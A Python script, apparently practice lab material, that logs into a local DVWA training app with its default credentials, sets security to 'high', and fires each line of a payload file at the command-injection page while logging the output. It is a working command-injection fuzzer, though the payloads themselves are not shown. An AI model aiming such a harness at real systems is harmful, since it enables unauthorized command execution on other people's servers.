from bs4 import BeautifulSoup
import sys
from requests import Session
from datetime import datetime
from tqdm import tqdm  # Para a barra de progresso
import os

BASE_URL = "http://localhost/dvwa/"
COMMAND_INJECTION_URL = f"{BASE_URL}/vulnerabilities/exec/"
BASE_PATH = os.path.dirname(os.path.realpath(__file__))
LOG_FILE = "latest.log"
COMMANDS_FILE = "comandos.txt"
LOG_PATH = os.path.join(BASE_PATH, LOG_FILE)



def get_list(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()

def send_command(session, url, data):
    response = session.post(url, data=data)
    return response

def extract_output(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    pre_tag = soup.find("pre")
    if pre_tag:
        return pre_tag.text.strip()
    return None

def log(command, status, output):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] Comando: {command}, Status: {status}, Saída: \n{output}"
    with open(LOG_PATH, "a") as log_file:
        log_file.write(log_entry + "\n")

def main():
    with open(LOG_PATH, "w") as log_file:
        log_file.write("")

    commands = get_list(os.path.join(BASE_PATH, COMMANDS_FILE))

    session = Session()
    login_url = f"{BASE_URL}/login.php"

    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find("input", {"name": "user_token"})["value"]

    login_data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    response = session.post(login_url, data=login_data)

    if "Welcome" not in response.text:
        print("[-] Falha no login. Verifique as credenciais.")
        sys.exit(1)

    security_level = "high"
    security_url = f"{BASE_URL}/security.php"

    response = session.get(security_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find("input", {"name": "user_token"})["value"]

    security_data = {
        "security": security_level,
        "seclev_submit": "Submit",
        "user_token": user_token
    }
    response = session.post(security_url, data=security_data)

    message = extract_output(response)
    if message:
        print(f"[+] Mensagem: {message}")
        if "CSRF token is incorrect" in message:
            print("[-] Token CSRF incorreto. Encerrando o script.")
            sys.exit(1)

    for command in tqdm(commands, desc="Progresso", unit="comando"):
        data = {
            "ip": command,
            "Submit": "Submit"
        }

        response = send_command(session, COMMAND_INJECTION_URL, data)
        output = extract_output(response)

        if output:
            log(command, "Sucesso", output)
            print(f"\n[+] Comando executado com sucesso: {command}")
            print(f"[+] Saída: {output}")
        else:
            log(command, "Falha", "Nenhuma saída encontrada")

if __name__ == "__main__":
    main()